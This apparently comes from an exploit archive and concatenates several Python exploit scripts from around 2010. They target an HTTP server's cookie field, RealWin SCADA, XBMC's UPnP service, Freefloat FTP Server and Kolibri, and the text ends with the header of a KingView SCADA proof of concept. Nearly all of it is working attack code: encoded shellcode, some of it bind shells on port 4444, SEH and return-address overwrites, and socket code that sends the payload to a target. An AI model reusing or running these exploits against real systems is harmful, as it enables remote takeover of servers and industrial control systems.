kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]
 
nopsled="\x90" * 20
 
# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'
 
shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")
 
payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode
 
buf="GET /vfolder.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"
  
print "[*] Connecting to Host " + host + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
     
print "[*] Sending malformed request..."
s.send(buf)
 
print "[!] Exploit has been sent!\n"
s.close()
# Exploit Title: RealWin SCADA System SEH Overwrite
# Date: 10-27-10
# Author: Blake
# Software Link: http://www.realflex.com/products/realwin/realwin.php
# Version: 1.06
# Tested on: Windows XP SP3 running in VMware Workstation (rfx)

import socket, sys

if len(sys.argv)!= 3:
    print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
    sys.exit(0)
 
host = sys.argv[1]
port = int(sys.argv[2])     # port 912 by default

# windows/shell_bind_tcp - 368 bytes Encoder: x86/shikata_ga_nai
# LPORT=4444, 
shellcode =(
"\xba\xe7\x26\x3b\xa1\x33\xc9\xb1\x56\xdb\xce\xd9\x74\x24\xf4"
"\x5d\x83\xc5\x04\x31\x55\x0b\x03\x55\xec\xc4\xce\x5d\x1a\x81"
"\x31\x9e\xda\xf2\xb8\x7b\xeb\x20\xde\x08\x59\xf5\x94\x5d\x51"
"\x7e\xf8\x75\xe2\xf2\xd5\x7a\x43\xb8\x03\xb4\x54\x0c\x8c\x1a"
"\x96\x0e\x70\x61\xca\xf0\x49\xaa\x1f\xf0\x8e\xd7\xef\xa0\x47"
"\x93\x5d\x55\xe3\xe1\x5d\x54\x23\x6e\xdd\x2e\x46\xb1\xa9\x84"
"\x49\xe2\x01\x92\x02\x1a\x2a\xfc\xb2\x1b\xff\x1e\x8e\x52\x74"
"\xd4\x64\x65\x5c\x24\x84\x57\xa0\xeb\xbb\x57\x2d\xf5\xfc\x50"
"\xcd\x80\xf6\xa2\x70\x93\xcc\xd9\xae\x16\xd1\x7a\x25\x80\x31"
"\x7a\xea\x57\xb1\x70\x47\x13\x9d\x94\x56\xf0\x95\xa1\xd3\xf7"
"\x79\x20\xa7\xd3\x5d\x68\x7c\x7d\xc7\xd4\xd3\x82\x17\xb0\x8c"
"\x26\x53\x53\xd9\x51\x3e\x3c\x2e\x6c\xc1\xbc\x38\xe7\xb2\x8e"
"\xe7\x53\x5d\xa3\x60\x7a\x9a\xc4\x5b\x3a\x34\x3b\x63\x3b\x1c"
"\xf8\x37\x6b\x36\x29\x37\xe0\xc6\xd6\xe2\xa7\x96\x78\x5c\x08"
"\x47\x39\x0c\xe0\x8d\xb6\x73\x10\xae\x1c\x02\x16\x60\x44\x47"
"\xf1\x81\x7a\x76\x5d\x0f\x9c\x12\x4d\x59\x36\x8a\xaf\xbe\x8f"
"\x2d\xcf\x94\xa3\xe6\x47\xa0\xad\x30\x67\x31\xf8\x13\xc4\x99"
"\x6b\xe7\x06\x1e\x8d\xf8\x02\x36\xc4\xc1\xc5\xcc\xb8\x80\x74"
"\xd0\x90\x72\x14\x43\x7f\x82\x53\x78\x28\xd5\x34\x4e\x21\xb3"
"\xa8\xe9\x9b\xa1\x30\x6f\xe3\x61\xef\x4c\xea\x68\x62\xe8\xc8"
"\x7a\xba\xf1\x54\x2e\x12\xa4\x02\x98\xd4\x1e\xe5\x72\x8f\xcd"
"\xaf\x12\x56\x3e\x70\x64\x57\x6b\x06\x88\xe6\xc2\x5f\xb7\xc7"
"\x82\x57\xc0\x35\x33\x97\x1b\xfe\x43\xd2\x01\x57\xcc\xbb\xd0"
"\xe5\x91\x3b\x0f\x29\xac\xbf\xa5\xd2\x4b\xdf\xcc\xd7\x10\x67"
"\x3d\xaa\x09\x02\x41\x19\x29\x07")


head = "\x64\x12\x54\x6A\x20\x00\x00\x00\xF4\x1F\x00\x00"
junk = "\x41" * 228
next_seh = "\xeb\x06\x90\x90"	# overwrites next seh
seh = "\xea\xe3\x02\x40" 		# seh overwritten at 232 bytes - 4002e3ea
nops = "\x90" * 20				# nop sled
junk2 = "\x42" * (7972 - len(shellcode)) # 1740 bytes for shellcode

print "\n====================================" 
print "DATAC RealWin 1.06 Buffer Overflow"
print "Written by Blake"
print "Discovered by Luigi Auriemma"
print "Tested on Windows XP SP3"
print "====================================\n"
 
print "[*] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host,port))
except:
    print "[x] Error establishing connection\n"
    sys.exit(0)
 
print "[*] Sending payload"
s.send(head + junk + next_seh + seh + nops + shellcode + junk2 + "\r\n")
s.close()
print "[*] Payload sent"
raw_input("[*] Press any key to exit...\n")#!/usr/bin/env python 

'''                   - XBMC upnp Remote Buffer Overflow -
=========================================================================
! Exploit Title: Xbmc soap_action_name post upnp sscanf buffer overflow !
=========================================================================
Date: 28th October 2010
=======================
Author: n00b  Realname: *carl cope* 
===================================
Software Link: http://xbmc.org/download/
========================================
Version: All versions are affected.
===================================
Tested on: Windows xp sp3,Vista sp2.
XBMC 9.04.1r20672 compiled june 2 2009. <--Version tested.
----------------------------------------------------------


-Description-
Well i had a little time to spare so i decided to revisit the
xbmc application and give it another look over which is a good
thing as i just have not had to time to work on exploit development 
lately and have to put more important things first unfortunately.

I decided to test the upnp protocol that was built into xbmc using the
Platinum UPnP SDK.And come across a sscanf buffer overflow
as you can see in the source code at the bottom of this exploit
that 100 bytes is allocated into a temp stack and then passed to
the sscanf function with no bounds check in place then its finally 
passed to PLT_HttpHelper::ParseBody which reads the xml body and parse it.
I've tested this exploit on windows and linux both work (Read comments).

All versions of xbmc where tested even the Dharma Beta 3 release is
also exploitable.But as ive worked with the xbmc developers before i 
know it will be fixed and patched as soon as i have informed them
great guys unlike other vendors i've worked with in the past.

I know the vulnerable function was marked with FIX ME = no sscanf.
They must have either missed it or have not got round to fixing this
yet.(See bottom of exploit for code)

The buffer overflow exists because of the vulnerable sdk used in the 
xbmc application.All versions of xbmc are exploitable but version 9.11
modules is compiled with seh protection.And i know previous release 
loaded the zlib1 module which was not compiled with safe seh.


See poc code for information and list of vendors.!!

-Description-


----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.
 
I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''

import sys, socket 
import struct


#Windows version does not change port every time its restarted.!!
#linux version changes port every time xbmc is restarted.!!

port = 52569 #You will have to find it on vuln server.
host = sys.argv[1] 

'''          !!IMPORTATNT!!                       
The UUID must be set i've hardcoded this 
to make it easy to replace with the victim UUID
you can get the UUID number from the server
by issuing a get request to the vulnerable server
on port 00000 you can use a web browser to do this.
example = http://127.0.0.1:00000


-Note-
Just a side note the port is random and once the xbmc
application is installed the UUID will be set up along 
with the port number at installation so you will have to 
do a port scan to find what port the service is running
on but once its found it will be on that port till it 
is reinstalled.Also the UUID will stay the same.

Universally Unique Identifier
---------------------------------------------------
XML example
<UDN>
uuid:0970aa46-ee68-3174-d548-44b656447658
</UDN> 
---------------------------------------------------
-Note-

I was not going to write an xml paraser just for this
when a web browser and a set of eyes can do it.:)

Xbmc media player uses the Platinum UPnP SDK 
http://www.plutinosoft.com/platinum
'''

#Create upnp request and place it in Request !!
Start_url ='AVTransport/'
Uuid = '1edcbdab-e75b-57fe-dbfa-55cc24ee630c' #Replace with the vuln server's Universally Unique Identifier. 
End_url ='/control.xml HTTP/1.1\n'
Soap = 'SOAPACTION: "urn:schemas-upnp-org:service:AVTransport:1#'
Junk_buffer1 = 'A'*128
Junk_buffer2 = 'B'*100

###The same address i used for the last xbmc exploits.
###/SafeSEH Module Scanner, item 55
# SEH mode=/SafeSEH OFF
# Base=0x62e80000
# Limit=0x62e97000
# Module Name=C:\Program Files\XBMC\zlib1.dll
###
###This was found in the module zlib1 and is universal.
#62E83BAC   5B               POP EBX
#62E83BAD   5D               POP EBP
#62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound

Pointer_To_Next_SEH = struct.pack('<L',0x909006eb)
SE_Handler = struct.pack('<L',0x62E83BAC)
Content_type = '\nCONTENT-TYPE:text/xml; charset="utf-8"\n'
Host = 'HOST: 192.168.1.2:50988\n'
Content_length = 'Content-Length: 345'

Shell_code=(#/*win32_bind -  EXITFUNC=seh LPORT=4444 Size=696
            #Encoder=Alpha2 http://metasploit.com */
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x37\x49\x49\x49\x49\x49"
    "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x69"
    "\x58\x50\x30\x42\x30\x42\x6b\x42\x41\x79\x32\x42\x42\x32\x41\x42"
    "\x42\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4d\x39\x39\x6c\x31"
    "\x7a\x4a\x4b\x72\x6d\x59\x78\x78\x79\x59\x6f\x49\x6f\x79\x6f\x45"
    "\x30\x4c\x4b\x70\x6c\x61\x34\x34\x64\x6c\x4b\x71\x55\x77\x4c\x4c"
    "\x4b\x63\x4c\x43\x35\x41\x68\x56\x61\x68\x6f\x4e\x6b\x70\x4f\x56"
    "\x78\x6e\x6b\x51\x4f\x65\x70\x77\x71\x5a\x4b\x31\x59\x6e\x6b\x47"
    "\x44\x6e\x6b\x45\x51\x6a\x4e\x75\x61\x6b\x70\x6c\x59\x6e\x4c\x4d"
    "\x54\x4f\x30\x31\x64\x54\x47\x59\x51\x39\x5a\x46\x6d\x77\x71\x39"
    "\x52\x78\x6b\x6b\x44\x57\x4b\x73\x64\x51\x34\x71\x38\x30\x75\x6d"
    "\x35\x6c\x4b\x71\x4f\x74\x64\x73\x31\x78\x6b\x51\x76\x4c\x4b\x74"
    "\x4c\x70\x4b\x4e\x6b\x51\x4f\x77\x6c\x36\x61\x4a\x4b\x43\x33\x56"
    "\x4c\x4e\x6b\x4c\x49\x30\x6c\x47\x54\x45\x4c\x31\x71\x78\x43\x30"
    "\x31\x4b\x6b\x50\x64\x6c\x4b\x50\x43\x70\x30\x4e\x6b\x57\x30\x34"
    "\x4c\x4e\x6b\x32\x50\x55\x4c\x6c\x6d\x4e\x6b\x41\x50\x63\x38\x61"
    "\x4e\x55\x38\x4e\x6e\x50\x4e\x66\x6e\x4a\x4c\x50\x50\x49\x6f\x6e"
    "\x36\x52\x46\x36\x33\x70\x66\x30\x68\x44\x73\x65\x62\x30\x68\x44"
    "\x37\x73\x43\x35\x62\x31\x4f\x71\x44\x4b\x4f\x38\x50\x45\x38\x5a"
    "\x6b\x78\x6d\x6b\x4c\x75\x6b\x56\x30\x79\x6f\x6b\x66\x61\x4f\x4f"
    "\x79\x6b\x55\x43\x56\x4c\x41\x7a\x4d\x37\x78\x35\x52\x66\x35\x50"
    "\x6a\x34\x42\x79\x6f\x58\x50\x41\x78\x78\x59\x67\x79\x4c\x35\x6e"
    "\x4d\x73\x67\x79\x6f\x4e\x36\x50\x53\x46\x33\x76\x33\x42\x73\x51"
    "\x43\x53\x73\x70\x53\x77\x33\x56\x33\x6b\x4f\x78\x50\x65\x36\x43"
    "\x58\x66\x71\x31\x4c\x73\x56\x33\x63\x6c\x49\x59\x71\x7a\x35\x30"
    "\x68\x4e\x44\x36\x7a\x62\x50\x39\x57\x76\x37\x6b\x4f\x6b\x66\x43"
    "\x5a\x32\x30\x72\x71\x32\x75\x39\x6f\x58\x50\x30\x68\x39\x34\x4e"
    "\x4d\x66\x4e\x4a\x49\x51\x47\x4b\x4f\x49\x46\x66\x33\x62\x75\x79"
    "\x6f\x4a\x70\x62\x48\x4d\x35\x33\x79\x6b\x36\x71\x59\x66\x37\x4b"
    "\x4f\x5a\x76\x76\x30\x50\x54\x70\x54\x70\x55\x4b\x4f\x6e\x30\x4a"
    "\x33\x30\x68\x4b\x57\x43\x49\x38\x46\x74\x39\x63\x67\x6b\x4f\x58"
    "\x56\x61\x45\x4b\x4f\x6e\x30\x51\x76\x41\x7a\x65\x34\x42\x46\x31"
    "\x78\x30\x63\x62\x4d\x6f\x79\x6b\x55\x33\x5a\x36\x30\x56\x39\x31"
    "\x39\x48\x4c\x4f\x79\x6d\x37\x73\x5a\x33\x74\x6b\x39\x6d\x32\x67"
    "\x41\x59\x50\x6c\x33\x6c\x6a\x79\x6e\x33\x72\x54\x6d\x49\x6e\x70"
    "\x42\x34\x6c\x6e\x73\x6c\x4d\x30\x7a\x34\x78\x4c\x6b\x4c\x6b\x4c"
    "\x6b\x42\x48\x50\x72\x39\x6e\x6d\x63\x52\x36\x49\x6f\x61\x65\x50"
    "\x44\x49\x6f\x7a\x76\x63\x6b\x71\x47\x31\x42\x73\x61\x51\x41\x66"
    "\x31\x30\x6a\x44\x41\x31\x41\x63\x61\x71\x45\x32\x71\x59\x6f\x6e"
    "\x30\x70\x68\x4c\x6d\x6e\x39\x53\x35\x7a\x6e\x41\x43\x49\x6f\x79"
    "\x46\x52\x4a\x6b\x4f\x6b\x4f\x65\x67\x4b\x4f\x7a\x70\x6e\x6b\x30"
    "\x57\x59\x6c\x6d\x53\x6a\x64\x50\x64\x39\x6f\x5a\x76\x52\x72\x39"
    "\x6f\x5a\x70\x50\x68\x58\x70\x6f\x7a\x54\x44\x63\x6f\x52\x73\x4b"
    "\x4f\x6a\x76\x49\x6f\x4e\x30\x69"
)

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Start_url + Uuid + End_url + Soap + Junk_buffer1 + Pointer_To_Next_SEH +
 SE_Handler + Shell_code + Junk_buffer2 + Content_type + Host + Content_length)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 
 
fileobj.write("POST /"+Request+"") 




#                  -Vulnerable source code-
# This information was found using windows 7 + Visual c++ 2010 express.

# .\xbmc\xbmc\lib\libUPnP\Platinum\Source\Core\PltDeviceHost.cpp

# /*----------------------------------------------------------------------
# |   PLT_DeviceHost::ProcessPostRequest
# +---------------------------------------------------------------------*/
# NPT_Result
# PLT_DeviceHost::ProcessHttpPostRequest(NPT_HttpRequest&              request,
                                       # const NPT_HttpRequestContext& context,
                                       # NPT_HttpResponse&             response) 
# {
    # NPT_Result                res;
    # NPT_String                service_type;
    # NPT_String                str;
    # NPT_XmlElementNode*       xml = NULL;
    # NPT_String                soap_action_header;
    # PLT_Service*              service;
    # NPT_XmlElementNode*       soap_body;
    # NPT_XmlElementNode*       soap_action;
    # const NPT_String*         attr;
    # PLT_ActionDesc*           action_desc;
    # PLT_ActionReference       action;
    # NPT_MemoryStreamReference resp(new NPT_MemoryStream);
    # NPT_String                ip_address  = context.GetRemoteAddress().GetIpAddress().ToString();
    # NPT_String                method      = request.GetMethod();
    # NPT_String                url         = request.GetUrl().ToRequestString(true);
    # NPT_String                protocol    = request.GetProtocol();

    # if (NPT_FAILED(FindServiceByControlURL(url, service, true)))
        # goto bad_request;

    # if (!request.GetHeaders().GetHeaderValue("SOAPAction"))
        # goto bad_request;

    # // extract the soap action name from the header
    # soap_action_header = *request.GetHeaders().GetHeaderValue("SOAPAction");
    # soap_action_header.TrimLeft('"');
    # soap_action_header.TrimRight('"');
    # char prefix[200];
    # char soap_action_name[100];                    <--- 100 bytes allocated for the soap action name.
    # int  ret;
    # //FIXME: no sscanf
    # ret = sscanf(soap_action_header, "%[^#]#%s",   <--- 
                 # prefix,                           <--- Bad very Bad.
                 # soap_action_name);                <--- 
    # if (ret != 2)
        # goto bad_request;

    # // read the xml body and parse it
    # if (NPT_FAILED(PLT_HttpHelper::ParseBody(request, xml))) <--- BOOOM I WIN!!
        # goto bad_request;

# Disassembly of vulnerable function.!!
# ==================================
# 025D2D23  lea         edx,[ebp-1F4h]  
# 025D2D29  push        edx  
# 025D2D2A  lea         eax,[ebp-188h]  
# 025D2D30  push        eax  
# 025D2D31  push        2F5E404h  
# 025D2D36  lea         ecx,[ebp-44h]  
# 025D2D39  call        NPT_String::operator char const * (1B1840Eh)  
# 025D2D3E  push        eax  
# 025D2D3F  call        @ILT+120575(_sscanf) (1AF7704h)  
# 025D2D44  add         esp,10h  
# 025D2D47  mov         dword ptr [ebp-1FCh],eax  


# Exploit Title: Freefloat FTP Server Buffer Overflow Vulnerability
# Date: 12/05/2010
# Author: 0v3r
# Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
# Tested on: Windows XP SP3 EN
# CVE: N/A

#!/usr/bin/python

import socket
import sys

def usage():

        print "usage  : ./freefloatftp.py <victim_ip>  <victim_port>"
        print "example: ./freefloatftp.py 192.168.1.100 21"

#Bind Shell shellcode port 4444
shellcode = ("\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
"\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
"\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
"\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
"\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
"\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
"\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
"\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
"\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
"\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
"\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
"\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
"\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
"\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
"\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
"\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
"\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
"\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
"\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
"\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
"\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
"\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
"\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
"\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
"\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a")


junk1  = "\x41" * 230
eip    = "\x53\x93\x42\x7E"  #7E429353 JMP ESP
nops   = "\x90" * 16
junk2  = "\x43" * (1000 - len(junk1 + eip + nops + shellcode))

buff   = junk1 + eip + nops + shellcode + junk2 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


print "\n"	
print "----------------------------------------------------------------"
print "|      Freefloat FTP Server Buffer Overflow Vulnerability      |"
print "----------------------------------------------------------------"
print "\n"


if len(sys.argv) != 3:
	usage()
        sys.exit()

ip   = sys.argv[1]
port = sys.argv[2]

try:
	print("[-] Connecting to " + ip + " on port " + port + "\n")
	s.connect((ip,int(port)))
	data = s.recv(1024)
	print("[-] Sending exploit...")
	s.send('USER ' + buff + '\r\n')
	s.close()
	print("[-] Exploit successfully sent...")
	print("[-] Connect to " + ip + " on port 4444")
except:
	print("[-] Connection error...")
	print("[-] Check if victim is up.")

#!/usr/bin/env python

#     _             ____  __            __    ___
#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / /
# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/ 
#                   Live by the byte     |_/_/ 
#
# Members:
#
# Pr0T3cT10n
# -=M.o.B.=-
# TheLeader (gsog2009 [a7] homtail [d0t] com)
# Sro
# Debug
#
# Contact: inv0ked.israel@gmail.com
#
# -----------------------------------
# Bug discovered by Pr0T3cT10n  
# Exploited by TheLeader, Debug
# -----------------------------------
# Description:
#
# Kolibri v2.0 is vulnerable to a remote buffer overflow attack.
# By sending a malformed HEAD request, we are able to overwrite both the return address and an SEH handler.
# Null bytes terminate the request though, but we are able to partially overwrite with a pointer to 
# a POP + POP + RET instruction inside kolibri.exe and gain control over the execution via SEH.
# This although gets complicated because the SEH handler offset between XP/2K3 and Vista/W7 is different
# by 2 bytes (probably due to local stack variables), thus we are able to cover only 2 operating system with the SEH overwrite exploit.
#
# In order to successfully exploit the RET overwrite, we need to either overwrite ret with jmp to the stack
# and then overwrite the stack with our shellcode, or find another way to get to our shellcode. Since null
# terminates the request string, it is impossible to pratially overwrite RET with an address from the binary
# and then overwrite with shellcode. We attempted finding another reliable way to get to our shellcode but haven't succeeded.
# The most reasonable option left is to overwrite RET with an OS specific address from a DLL that gets loaded by Kolibri.
# -----------------------------------
#
# Exploit Title: Kolibri v2.0 Buffer Overflow RET + SEH exploit (HEAD)
# Date: 24/12/2010
# Author: TheLeader
# Affected Version: Kolibri-2.0
# Tested on: Windows 7 x86 ENG/HEB , Windows Server 2003 SP2 ENG, Windows XP SP3 ENG
# ISRAEL, NULLBYTE.ORG.IL

import socket
import sys

print "\n  Kolibri v2.0 Buffer Overflow RET + SEH exploit"

usage = (
"  Usage: kexploit.py host port [mode]\n\n"
"  Modes:\n"
"    1 - RET = XP SP3 ENG, SEH = VISTA + WIN7 (default)\n"
"    2 - RET = SERVER2003 SP2 ENG, SEH = VISTA + WIN7\n"
"    3 - RET = XP SP3 ENG, SEH = XP + SERVER2003\n"
"    4 - RET = SERVER2003 SP2 ENG, SEH = XP + SERVER2003\n"
)

if len(sys.argv) < 3:
	print usage
	sys.exit(0)

host = sys.argv[1]

try:
	port = int(sys.argv[2])
except ValueError:
	print "  [-] Error: port must be numeric!"
	sys.exit(1)

if len(sys.argv) > 3:
	try:
		mode = int(sys.argv[3])
	except ValueError:
		print "  [-] Error: mode must be numeric!"
		sys.exit(1)
else:
	mode = 1

# ret offsets = 213, 515
ret_offset = 515

seh_offset_xp_2k3 = 792 # WINXP / WS2K3
seh_offset_vista_7 = 794 # VISTA / WIN7

# badchars = [0x00, 0x0d, 0x0a, 0x20, 0x3d, 0x3f]
shellcode = (
"\xb8\xe2\x96\x27\xb0\x33\xc9\xda\xde\xd9\x74\x24\xf4\x5b"
"\xb1\x32\x31\x43\x10\x83\xeb\xfc\x03\xa1\x9a\xc5\x45\xd9"
"\x4b\x80\xa6\x21\x8c\xf3\x2f\xc4\xbd\x21\x4b\x8d\xec\xf5"
"\x1f\xc3\x1c\x7d\x4d\xf7\x97\xf3\x5a\xf8\x10\xb9\xbc\x37"
"\xa0\x0f\x01\x9b\x62\x11\xfd\xe1\xb6\xf1\x3c\x2a\xcb\xf0"
"\x79\x56\x24\xa0\xd2\x1d\x97\x55\x56\x63\x24\x57\xb8\xe8"
"\x14\x2f\xbd\x2e\xe0\x85\xbc\x7e\x59\x91\xf7\x66\xd1\xfd"
"\x27\x97\x36\x1e\x1b\xde\x33\xd5\xef\xe1\x95\x27\x0f\xd0"
"\xd9\xe4\x2e\xdd\xd7\xf5\x77\xd9\x07\x80\x83\x1a\xb5\x93"
"\x57\x61\x61\x11\x4a\xc1\xe2\x81\xae\xf0\x27\x57\x24\xfe"
"\x8c\x13\x62\xe2\x13\xf7\x18\x1e\x9f\xf6\xce\x97\xdb\xdc"
"\xca\xfc\xb8\x7d\x4a\x58\x6e\x81\x8c\x04\xcf\x27\xc6\xa6"
"\x04\x51\x85\xac\xdb\xd3\xb3\x89\xdc\xeb\xbb\xb9\xb4\xda"
"\x30\x56\xc2\xe2\x92\x13\x3c\xa9\xbf\x35\xd5\x74\x2a\x04"
"\xb8\x86\x80\x4a\xc5\x04\x21\x32\x32\x14\x40\x37\x7e\x92"
"\xb8\x45\xef\x77\xbf\xfa\x10\x52\xdc\x9d\x82\x3e\x23")

ret_xp_sp3 = "\x13\x44\x87\x7C" # 0x7C874413 WINXP SP3 JMP ESP @ kernel32.dll
ret_2k3_sp2 = "\xC3\x3B\xF7\x76" # 0x76F73BC3 WS2K3 SP2 JMP ESP @ winrnr.dll

if mode == 1:
	ret = ret_xp_sp3
	seh_offset = seh_offset_vista_7
elif mode == 2:
	ret = ret_2k3_sp2
	seh_offset = seh_offset_vista_7
elif mode == 3:
	ret = ret_xp_sp3
	seh_offset = seh_offset_xp_2k3
elif mode == 4:
	ret = ret = ret_2k3_sp2
	seh_offset = seh_offset_xp_2k3

seh = "\x67\x1a\x48" # 0x0045586B @ kolibri.exe POP + POP + RET

nseh="\x90\x90\xeb\xf7"
jmp_back2 = "\xE9\x12\xFF\xFF\xFF"

buf = "\x41" * (ret_offset)
nops = "\x90" * (seh_offset - len(buf + ret + shellcode + jmp_back2 + nseh))

req = ("HEAD /" + buf + ret + nops + shellcode + jmp_back2 + nseh + seh + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

print "  [+] Connecting to %s:%d" % (host, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print "  [+] Sending payload.."
s.send(req)
data = s.recv(1024)

print "  [+] Closing connection.."
s.close()

print "  [+] Done!"## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC
## Date: 9/28/2010
## Author: Dillon Beresford
## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar
## Version: 6.53 (English)
## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. 

## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.
